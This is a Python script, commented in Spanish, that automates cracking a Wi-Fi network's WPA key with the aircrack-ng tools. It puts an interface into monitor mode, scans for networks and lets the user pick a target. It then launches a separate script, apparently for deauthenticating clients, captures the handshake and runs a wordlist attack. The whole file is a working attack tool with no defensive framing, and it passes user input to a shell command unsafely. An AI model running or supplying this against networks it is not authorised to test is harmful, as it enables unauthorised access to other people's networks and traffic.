import subprocess
import csv


  #...........................................................................Escaneando......................................

# Preguntar por el nombre de la interfaz
interfaz = input("Ingrese el nombre de la interfaz: ")
wordlist= input("Ingrese la direccion de la wordlist a utlizar: ")

# Ejecutar los comandos
try:
    # Ejecutar airmon-ng check kill
    subprocess.run(["airmon-ng", "check", "kill"], check=True)

    # Iniciar la interfaz en modo monitor
    subprocess.run(["airmon-ng", "start", interfaz], check=True)

    # Ejecutar aireplay-ng --test [interfaz]
    subprocess.run(["aireplay-ng", "--test", interfaz])

    # Ejecutar airodump-ng -w salida [interfaz]
    subprocess.run(["airodump-ng", "-w", "salida", interfaz])

except KeyboardInterrupt:
    print("\nProceso detenido manualmente.")
    
    #...........................................................................Selecionando objetivo......................................
def mostrar_csv_numerado(archivo_csv):
    with open(archivo_csv, 'r') as archivo:
        lector_csv = csv.reader(archivo)
        lineas = list(lector_csv)
        
        for numero, linea in enumerate(lineas, start=1):
            print(f"{numero}: {linea}")
    
    return lineas

def obtener_datos_seleccionados(lineas, numero_linea):
    try:
        linea_seleccionada = lineas[numero_linea - 1]
        bssid = linea_seleccionada[0]
        channel = linea_seleccionada[3]
        essid = linea_seleccionada[13].strip()
        return bssid, channel, essid
    except IndexError:
        print("Número de línea fuera de rango.")
        return None, None, None

archivo_csv = 'salida-01.csv'
lineas = mostrar_csv_numerado(archivo_csv)

numero_linea = int(input("Ingrese el número de línea para mostrar los datos seleccionados: "))
bssid, channel, essid = obtener_datos_seleccionados(lineas, numero_linea)

if bssid is not None:
    print("Datos seleccionados:")
    print(f"BSSID: {bssid}")
    print(f"Channel: {channel}")
    print(f"ESSID: {essid}")



#...........................................................................Desconectar dispositivo ......................................
def abrir_nueva_pestania(bssid, interfaz):
    # Comando para abrir una nueva pestaña en la terminal
    comando = f"gnome-terminal -- python3 script2.py {bssid} {interfaz}"
    # Ejecutar el comando en un proceso secundario
    subprocess.Popen(comando, shell=True)

if __name__ == "__main__":
    abrir_nueva_pestania(bssid, interfaz)






      
#...........................................................................crackeo ......................................
channel = channel.strip()
interfaz = interfaz.strip()

# Construir y ejecutar el comando
comando = ["airodump-ng", "-c", channel, "-w", "capturado", "--bssid", bssid, interfaz]
print("Comando a ejecutar:", ' '.join(comando))

try:
    # Escanear el objetivo para ver estaciones
    subprocess.run(comando, check=True)
except subprocess.CalledProcessError as e:
    print(f"Error al ejecutar el comando: {e}")
except KeyboardInterrupt:
    print("\nProceso detenido manualmente.")

try:
    # Ejecutar airmon-ng parar modo monitor
    subprocess.run(["airmon-ng", "stop", interfaz], check=True)

    # Iniciar Crackeo
    subprocess.run(["aircrack-ng", "-w", wordlist, "capturado-01.cap"])

    
except KeyboardInterrupt:
    print("\nProceso detenido manualmente.")


